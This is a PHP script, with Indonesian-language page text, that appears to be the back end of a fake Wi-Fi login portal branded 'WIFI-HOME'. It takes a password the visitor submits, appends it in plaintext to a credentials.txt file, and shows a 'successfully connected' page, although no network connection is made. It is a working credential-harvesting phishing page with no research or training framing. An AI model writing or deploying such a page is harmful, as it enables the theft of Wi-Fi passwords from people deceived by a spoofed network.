
<?php
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: index.php');
    exit;
}

$nama = trim($_POST['nama'] ?? '');

if ($nama === '' || mb_strlen($nama) > 100) {
    http_response_code(400);
    exit('Password tidak valid. Pastikan tidak kosong dan tidak lebih dari 100 karakter.');
}

$nama = preg_replace('/[\r\n\t]+/u', ' ', $nama);

if ($nama === null) {
    http_response_code(400);
    exit('Format Password tidak valid. Pastikan hanya berisi karakter yang diperbolehkan.');
}

$waktu = date('Y-m-d H:i:s');
$baris = $waktu . ' | Nama: ' . $nama . PHP_EOL;

$file = __DIR__ . '/credentials.txt';

if (file_put_contents(
    $file,
    $baris,
    FILE_APPEND | LOCK_EX
) === false) {
    http_response_code(500);
    exit('Terjadi kesalahan saat menyimpan data. Silakan coba lagi.');
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#07111f">
    <title>Berhasil Tersambung</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <main class="portal">
        <div class="logo-container">
            <img
                src="assets/wifi-logo.svg"
                alt="Logo Wi-Fi"
                class="wifi-logo"
            >
        </div>

        <p class="eyebrow">WIFI-HOME</p>
        <h1>Berhasil Terhubung!</h1>

        <p class="description">
            Terima kasih,
            <?= htmlspecialchars($nama, ENT_QUOTES, 'UTF-8') ?>.
            Password Anda telah dicatat dan pendaftaran berhasil disimpan.
        </p>

        <div class="connection-status">
            <span class="status-dot"></span>
            Portal masuk Wi-Fi
        </div>

        <p class="notice">
            Pastikan untuk selalu menjaga keamanan akun Anda dan tidak membagikan password kepada pihak lain.
        </p>

        <button type="button" onclick="window.location.href='index.php'">
            Kembali ke halaman utama
        </button>
    </main>
</body>
</html>
